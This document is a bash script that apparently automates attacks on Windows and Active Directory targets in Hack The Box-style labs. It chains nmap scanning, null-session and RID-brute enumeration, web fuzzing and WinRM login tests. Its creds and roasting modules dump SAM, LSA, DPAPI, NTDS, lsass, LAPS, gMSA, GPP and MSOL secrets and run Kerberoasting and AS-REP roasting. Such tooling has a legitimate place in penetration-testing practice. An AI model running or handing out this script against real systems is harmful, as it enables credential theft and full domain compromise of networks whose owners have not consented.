#!/bin/bash

DIM='\033[2m'
PURPLE='\033[38;5;99m'
GRAY='\033[38;5;245m'
YELLOW='\033[38;5;221m'
RED='\033[38;5;203m'
BLUE='\033[38;5;75m'
RESET='\033[0m'

#------------------------------------------------

LOGFILE="${LOGFILE:-/dev/null}"

log() {
  local line
  line=$(echo -e "$*")
  printf '%s\n' "$line"
  printf '%s\n' "$line" | sed -r 's/\x1B\[[0-9;]*[mK]//g' >>"$LOGFILE"
}
info() { log " ${GRAY}$*${RESET}"; }
warn() { log " ${YELLOW}$*${RESET}"; }
err() {
  local line
  line=$(echo -e " ${RED}$*${RESET}")
  printf '%s\n' "$line" >&2
  printf '%s\n' "$line" | sed -r 's/\x1B\[[0-9;]*[mK]//g' >>"$LOGFILE"
}
ask() { echo -ne " $* "; }
show() { log "${GRAY}$*${RESET}"; }

run() {
  FORCE_COLOR=1 "$@" 2>&1 | tee >(sed -r 's/\x1B\[[0-9;]*[mK]//g' >>"$LOGFILE")
}

cmdline() {
  local IFS=' '
  printf '%s\n' "$*"
}

require_tool() {
  local tool="$1"
  if ! command -v "$tool" &>/dev/null; then
    warn "$tool not found - skipping"
    return 1
  fi
  return 0
}

section() {
  local cols
  cols=$(tput cols 2>/dev/null || echo 80)
  local line
  printf -v line "%${cols}s" ''
  line="${line// /─}"
  log ""
  log "${PURPLE} $*${RESET}"
  log "${PURPLE}${line}${RESET}"
}
subsection() {
  local cols
  cols=$(tput cols 2>/dev/null || echo 80)
  cols=$((cols / 2))
  local line
  printf -v line "%${cols}s" ''
  line="${line// /─}"
  log ""
  log " ${BLUE}$*${RESET}"
  log " ${BLUE}${line}${RESET}"
}

add_host() {
  local host="$1"
  [[ -z "$host" ]] && return

  if grep -qw "$host" /etc/hosts 2>/dev/null; then
    local current_ip
    current_ip=$(grep -w "$host" /etc/hosts | awk '{print $1}' | head -1)

    if [[ "$current_ip" == "$IP" ]]; then
      info "$host already in /etc/hosts with correct IP ($IP) - skipping"
    else
      warn "$host is mapped to $current_ip, but current IP is $IP"
      ask "replace '$current_ip $host' with '$IP $host'? [Y/n]"
      read -r confirm
      if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
        sudo sed -i "s/^[[:space:]]*${current_ip}[[:space:]].*${host}.*/${IP}\t${host}/" /etc/hosts
        info "updated $IP $host"
      else
        info "kept existing entry: $current_ip $host"
      fi
    fi

  elif grep -qP "^\s*${IP}\s" /etc/hosts 2>/dev/null; then
    ask "append '$host' to existing $IP line? [Y/n]"
    read -r confirm
    if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
      sudo sed -i "/^\s*${IP}\s/s/$/ ${host}/" /etc/hosts
      info "appended → $host"
    fi

  else
    ask "add '$IP $host' to /etc/hosts? [Y/n]"
    read -r confirm
    if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
      printf '%s\t%s\n' "$IP" "$host" | sudo tee -a /etc/hosts >/dev/null
      info "added → $IP $host"
    fi
  fi
}

resolve_domain() {
  local raw="$1"
  if [[ "$raw" == *.* ]]; then
    echo "$raw"
  else
    echo "${raw}.htb"
  fi
}

usage() {
  echo "usage: $0 <IP> [options]"
  echo
  echo "  IP                  target IP address"
  echo "  -n <name>           hostname for /etc/hosts (default .htb)"
  echo "  -m <modules>        comma-separated list of modules"
  echo "                      available modules: nmap,smb,ldap,ftp,creds,roasting,web,winrm"
  echo "  -u <user>           username"
  echo "  -p <pass>           password"
  echo "  -f                  full port scan (-p-) instead of top 1000"
  echo "  -h                  show this help"
  echo
  echo "examples:"
  echo
  echo "basic scan: $0 10.10.11.100 -n mybox"
  echo "authenticated scan: $0 10.10.11.100 -n mybox -u admin -p 'P@ss1'"
  echo "specific modules scan: $0 10.10.11.100 -n mybox -u admin -p 'P@ss1' -m smb,web"
  exit 1
}

# Argument parsing ------------------------------------------------------------------
IP=""
NAME=""
USER_ARG=""
PASS_ARG=""
MODULES_ARG=""
FULL_SCAN=""

if [[ $# -lt 1 || "$1" == -* ]]; then
  usage
fi

IP="$1"
shift

while [[ $# -gt 0 ]]; do
  case "$1" in
  -h | --help)
    usage
    ;;
  -f)
    FULL_SCAN=1
    shift
    ;;
  -n)
    NAME="$2"
    shift 2
    ;;
  -u)
    USER_ARG="$2"
    shift 2
    ;;
  -p)
    PASS_ARG="$2"
    shift 2
    ;;
  -m)
    MODULES_ARG="$2"
    shift 2
    ;;
  *)
    err "unknown argument: $1"
    usage
    ;;
  esac
done

if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
  err "invalid IP: $IP"
  exit 1
fi

MODULES=(nmap smb ldap ftp creds roasting web winrm)
SELECTED=""
if [[ -n "$MODULES_ARG" ]]; then
  for m in ${MODULES_ARG//,/ }; do
    [[ " ${MODULES[*]} " == *" $m "* ]] || {
      err "unknown module: $m (available: ${MODULES[*]})"
      usage
    }
    SELECTED="$SELECTED $m"
  done
  SELECTED="${SELECTED# }"
else
  SELECTED="${MODULES[*]}"
fi

DOMAIN=""
if [[ -n "$NAME" ]]; then
  DOMAIN=$(resolve_domain "$NAME")
fi

LOGFILE="recon_${IP}.log"
NMAP_FILE="nmap_${IP}.txt"

# nmap ----------------------------------------------------------------------------

mod_nmap() {
  require_tool nmap || return

  # full scan always wins - don't overwrite it with a fast one
  if [[ -z "$FULL_SCAN" && -f "$NMAP_FILE" ]] && grep -q '^# scan: full' "$NMAP_FILE" 2>/dev/null; then
    section "port scan"
    info "full scan already in $NMAP_FILE - reusing, skipping nmap"
    NMAP_OUTPUT="$(cat "$NMAP_FILE")"
    return
  fi

  : >"$LOGFILE"
  section "port scan"
  local SCAN_FLAGS=(-sC -sV --open)
  if [[ -n "$FULL_SCAN" ]]; then
    SCAN_FLAGS+=(-p- -T4)
  else
    SCAN_FLAGS+=(--top-ports 1000)
  fi
  show nmap "${SCAN_FLAGS[@]}" "$IP"
  NMAP_OUTPUT=$(nmap "${SCAN_FLAGS[@]}" "$IP" 2>&1)
  {
    printf '# scan: %s\n' "${FULL_SCAN:-top1000}"
    printf '# host: %s\n' "$IP"
    printf '%s\n' "$NMAP_OUTPUT"
  } >"$NMAP_FILE"
  log "$NMAP_OUTPUT"
  info "scan saved to $NMAP_FILE"
}

# Parse ports from nmap output into arrays
parse_ports() {
  # Define ports that shouldn't be treated as web services even if they show HTTP
  local WEB_BLOCKLIST="53 88 135 139 389 445 464 593 636 3268 3269 5985 5986 47001 49680"

  # Extract potential web ports and filter out blacklisted ones
  # (exclude RPC/WinRM-over-HTTP services like ncacn_http, http-rpc-epmap, http-wsman)
  local RAW_WEB_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^[0-9]+/tcp.*open' | awk '$3 ~ /https?/ && $3 !~ /ncacn|rpc|wsman/' | awk -F/ '{print $1}' | sort -u))

  WEB_PORTS=()
  for port in "${RAW_WEB_PORTS[@]}"; do
    if ! echo "$WEB_BLOCKLIST" | grep -qw "$port"; then
      WEB_PORTS+=("$port")
    fi
  done

  SMB_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^(139|445)/tcp.*open' | awk -F/ '{print $1}' | sort -u))
  LDAP_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^(389|636|3268|3269)/tcp.*open' | awk -F/ '{print $1}' | sort -u))
  FTP_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^21/tcp.*open' | awk -F/ '{print $1}' | sort -u))
  WINRM_PORTS=($(echo "$NMAP_OUTPUT" | grep -E '^(5985|5986)/tcp.*open' | awk -F/ '{print $1}' | sort -u))
}

# nmap / port source --------------------------------------------------------------------
if [[ " $SELECTED " != *" nmap "* ]]; then
  if [[ -f "$NMAP_FILE" ]]; then
    section "port scan"
    info "existing scan found in $NMAP_FILE - reusing ports, skipping nmap"
  elif [[ -s "$LOGFILE" ]]; then
    section "port scan"
    info "existing scan found in $LOGFILE - reusing ports, skipping nmap"
  else
    warn "no existing scan and nmap not selected - forcing nmap module"
    SELECTED="$SELECTED nmap"
  fi
fi

[[ " $SELECTED " == *" nmap "* ]] && mod_nmap

if [[ -z "$NMAP_OUTPUT" ]]; then
  if [[ -f "$NMAP_FILE" ]]; then
    NMAP_OUTPUT="$(cat "$NMAP_FILE")"
  else
    NMAP_OUTPUT="$(cat "$LOGFILE")"
  fi
fi
parse_ports

info "debug ports -> web: ${WEB_PORTS[*]:-none} | smb: ${SMB_PORTS[*]:-none} | ldap: ${LDAP_PORTS[*]:-none} | ftp: ${FTP_PORTS[*]:-none} | winrm: ${WINRM_PORTS[*]:-none}"

# /etc/hosts -----------------------------------------------------------------------
section "/etc/hosts"

if [[ -z "$DOMAIN" ]]; then
  EXISTING_HOST=$(awk -v ip="$IP" '$1==ip {print $2; exit}' /etc/hosts 2>/dev/null)
  if [[ -n "$EXISTING_HOST" ]]; then
    DOMAIN="$EXISTING_HOST"
    info "found existing /etc/hosts entry for $IP - '$DOMAIN'"
    FOUND_HOST=1
  else
    ask "no name given (-n) - enter a name for /etc/hosts (blank to skip):"
    read -r ENTERED_NAME
    [[ -n "$ENTERED_NAME" ]] && DOMAIN=$(resolve_domain "$ENTERED_NAME")
  fi
fi

[[ -n "$DOMAIN" && -z "$FOUND_HOST" ]] && add_host "$DOMAIN"

# smb module -----------------------------------------------------------------------

mod_smb() {
  section 'SMB Recon'
  require_tool nxc || return

  [[ ${#SMB_PORTS[@]} -eq 0 ]] && {
    warn "no SMB ports found - skipping nxc"
    return
  }

  info "ports: ${SMB_PORTS[*]}"

  SMB_TARGET="${DOMAIN:-$IP}"

  NXC_ARGS=(nxc smb "$SMB_TARGET")

  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
    NXC_ARGS+=(-u "$USER_ARG" -p "$PASS_ARG")
    NXC_ARGS+=(--local-groups --loggedon-users --rid-brute --users --shares --pass-pol)
  elif [[ -n "$USER_ARG" ]]; then
    warn "username provided but no password - enumeration flags require both"
    NXC_ARGS+=(-u "$USER_ARG")
  else
    info "no credentials provided - attempting null session"
    NXC_ARGS+=(-u '' -p '' --shares --users --rid-brute)
  fi

  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"
}

# ldap module -----------------------------------------------------------------------

mod_ldap() {
  section 'LDAP Recon'
  require_tool nxc || return

  [[ ${#LDAP_PORTS[@]} -eq 0 ]] && {
    warn "no LDAP ports found - skipping nxc"
    return
  }

  info "ports: ${LDAP_PORTS[*]}"

  LDAP_TARGET="${DOMAIN:-$IP}"

  NXC_ARGS=(nxc ldap "$LDAP_TARGET")

  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
    NXC_ARGS+=(-u "$USER_ARG" -p "$PASS_ARG")
    NXC_ARGS+=(--trusted-for-delegation --password-not-required --admin-count --users --groups)
  elif [[ -n "$USER_ARG" ]]; then
    warn "username provided but no password - enumeration flags require both"
    NXC_ARGS+=(-u "$USER_ARG")
  else
    info "no credentials provided - attempting anonymous bind"
    NXC_ARGS+=(-u '' -p '' --users)
  fi

  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"
}

# ftp module -----------------------------------------------------------------------

mod_ftp() {
  section 'FTP Recon'
  require_tool nxc || return

  [[ ${#FTP_PORTS[@]} -eq 0 ]] && {
    warn "no FTP ports found - skipping nxc"
    return
  }

  info "ports: ${FTP_PORTS[*]}"

  FTP_TARGET="${DOMAIN:-$IP}"

  NXC_ARGS=(nxc ftp "$FTP_TARGET")

  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
    NXC_ARGS+=(-u "$USER_ARG" -p "$PASS_ARG")
  elif [[ -n "$USER_ARG" ]]; then
    warn "username provided but no password - some modules may require both"
    NXC_ARGS+=(-u "$USER_ARG")
  else
    info "no credentials provided - attempting anonymous login"
    NXC_ARGS+=(-u "anonymous" -p "anonymous")
  fi

  NXC_ARGS+=(--ls)

  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"
}

# winrm module -----------------------------------------------------------------------

mod_winrm() {
  section 'WinRM Recon'

  if [[ ${#WINRM_PORTS[@]} -eq 0 ]]; then
    info "not detected"
    return
  fi

  info "ports: ${WINRM_PORTS[*]}"

  WINRM_TARGET="${DOMAIN:-$IP}"

  if [[ -n "$USER_ARG" && -n "$PASS_ARG" ]]; then
    if require_tool evil-winrm; then
      EW_ARGS=(timeout 10 evil-winrm -i "$WINRM_TARGET" -u "$USER_ARG" -p "$PASS_ARG" -c whoami)
      show "$(cmdline "${EW_ARGS[@]}")"
      EW_OUTPUT=$("${EW_ARGS[@]}" 2>&1)
      if [[ -n "$EW_OUTPUT" ]]; then
        log "$EW_OUTPUT"
      else
        warn "connection failed - no output (wrong creds or WinRM not responding)"
      fi
    fi
  elif [[ -n "$USER_ARG" ]]; then
    warn "WinRM detected but password required"
    warn "evil-winrm -i $WINRM_TARGET -u '$USER_ARG' -p <password>"
  else
    warn "WinRM detected - try evil-winrm after obtaining credentials"
  fi
}

# creds module -----------------------------------------------------------------------

mod_creds() {
  section 'Credential Dumping'
  require_tool nxc || return

  if [[ -z "$USER_ARG" || -z "$PASS_ARG" ]]; then
    warn "credentials required for dumping - use -u and -p flags"
    return
  fi

  CREDS_TARGET="${DOMAIN:-$IP}"
  CREDS_AUTH=(-u "$USER_ARG" -p "$PASS_ARG")

  # SAM + LSA + DPAPI
  subsection "Secrets Dump (SAM + LSA + DPAPI)"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" --sam --lsa --dpapi)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # NTDS
  subsection "NTDS Dump"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" --ntds)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # ntdsutil
  subsection "NTDS Util"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M ntdsutil)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # lsassy
  subsection "lsassy (lsass dump)"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M lsassy)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # LAPS
  subsection "LAPS (Local Admin Passwords)"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" --laps)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # gMSA
  subsection "gMSA (Group Managed Service Accounts)"
  NXC_ARGS=(nxc ldap "$CREDS_TARGET" "${CREDS_AUTH[@]}" --gmsa)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # Group Policy Preferences
  subsection "Group Policy Preferences"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M gpp_password)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # MSOL
  subsection "MSOL Account Password"
  NXC_ARGS=(nxc smb "$CREDS_TARGET" "${CREDS_AUTH[@]}" -M msol)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"
}

# web module -----------------------------------------------------------------------

mod_web() {
  section 'Web Recon'
  require_tool ffuf || return

  [[ ${#WEB_PORTS[@]} -eq 0 ]] && {
    warn "no web ports found - skipping ffuf"
    return
  }

  info "ports: ${WEB_PORTS[*]}"

  DIR_WL="/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt"
  DNS_WL="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
  [[ ! -f "$DIR_WL" ]] && DIR_WL="/usr/share/wordlists/dirb/common.txt"
  [[ ! -f "$DNS_WL" ]] && DNS_WL="/usr/share/wordlists/dirb/common.txt"

  WEB_IP="${DOMAIN:-$IP}"

  for PORT in "${WEB_PORTS[@]}"; do
    SCHEME="http"
    [[ "$PORT" == "443" ]] && SCHEME="https"
    if [[ "$PORT" == "80" || "$PORT" == "443" ]]; then
      BASE_URL="${SCHEME}://${WEB_IP}"
    else
      BASE_URL="${SCHEME}://${WEB_IP}:${PORT}"
    fi

    INSECURE=""
    [[ "$SCHEME" == "https" ]] && INSECURE="-k"

    subsection "Directories - ${BASE_URL}"
    info "Use Ctrl + C to skip"
    FFUF_ARGS=(ffuf -s -u "${BASE_URL}/FUZZ" -w "$DIR_WL" -t 80 -fc 404,403 -ac -noninteractive)
    [[ -n "$INSECURE" ]] && FFUF_ARGS+=(-k)
    show "$(cmdline "${FFUF_ARGS[@]}")"
    run "${FFUF_ARGS[@]}"

    if [[ -n "$DOMAIN" ]]; then
      subsection "Subdomains - ${DOMAIN}"
      FFUF_ARGS=(ffuf -s -u "${SCHEME}://FUZZ.${DOMAIN}" -w "$DNS_WL" -t 20 -timeout 5 -fc 404,400 -ac -noninteractive)
      [[ -n "$INSECURE" ]] && FFUF_ARGS+=(-k)
      show "$(cmdline "${FFUF_ARGS[@]}")"
      run "${FFUF_ARGS[@]}"

      subsection "Vhosts - ${DOMAIN}"
      FFUF_ARGS=(ffuf -s -u "${SCHEME}://${IP}" -H "Host: FUZZ.${DOMAIN}" -w "$DNS_WL" -t 15 -timeout 5 -fc 404,400 -ac -noninteractive)
      [[ -n "$INSECURE" ]] && FFUF_ARGS+=(-k)
      show "$(cmdline "${FFUF_ARGS[@]}")"
      run "${FFUF_ARGS[@]}"
    fi

    subsection "WordPress Scan"
    if require_tool wpscan; then
      WPSCAN_ARGS=(wpscan --url "$BASE_URL" --no-banner)
      [[ "$SCHEME" == "https" ]] && WPSCAN_ARGS+=(--disable-tls-checks)
      show "$(cmdline "${WPSCAN_ARGS[@]}")"
      run "${WPSCAN_ARGS[@]}"
    fi
  done
}

# roasting module -----------------------------------------------------------------------

mod_roasting() {
  section 'Roasting'
  require_tool nxc || return

  if [[ -z "$USER_ARG" || -z "$PASS_ARG" ]]; then
    warn "credentials required for roasting - use -u and -p flags"
    return
  fi

  [[ ${#LDAP_PORTS[@]} -eq 0 ]] && {
    warn "no LDAP ports found - skipping roasting"
    return
  }

  info "ports: ${LDAP_PORTS[*]}"

  ROAST_TARGET="${DOMAIN:-$IP}"
  ROAST_AUTH=(-u "$USER_ARG" -p "$PASS_ARG")

  # Kerberoasting
  subsection "Kerberoasting"
  NXC_ARGS=(nxc ldap "$ROAST_TARGET" "${ROAST_AUTH[@]}" --kerberoasting kerberoasting.txt)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"

  # AS-REP roasting
  subsection "AS-REP Roasting"
  NXC_ARGS=(nxc ldap "$ROAST_TARGET" "${ROAST_AUTH[@]}" --asreproast asreproast.txt)
  show "$(cmdline "${NXC_ARGS[@]}")"
  run "${NXC_ARGS[@]}"
}

# Module dispatch ------------------------------
for m in ${MODULES[*]}; do
  if [[ " $SELECTED " != *" $m "* ]]; then
    continue
  fi
  case "$m" in
  web) mod_web ;;
  smb) mod_smb ;;
  ldap) mod_ldap ;;
  ftp) mod_ftp ;;
  winrm) mod_winrm ;;
  creds) mod_creds ;;
  roasting) mod_roasting ;;
  esac
done

log ""
log " ${DIM}Full log saved: $LOGFILE${RESET}"
log ""
